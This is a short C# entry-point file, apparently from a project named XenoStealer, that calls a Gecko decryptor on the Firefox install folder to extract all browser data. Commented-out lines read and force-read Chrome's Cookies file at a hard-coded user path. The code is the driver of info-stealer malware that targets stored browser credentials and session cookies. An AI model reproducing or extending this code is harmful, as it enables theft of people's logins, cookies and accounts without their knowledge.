using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {

            bool g = Environment.Is64BitProcess;


            GeckoDecryptor a = new GeckoDecryptor(@"C:\Program Files\Mozilla Firefox");
            var t=Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
            var y = g;
            //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);

            
            //byte[] data=Utils.ForceReadFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
            //bool h = g;

        }
    }
}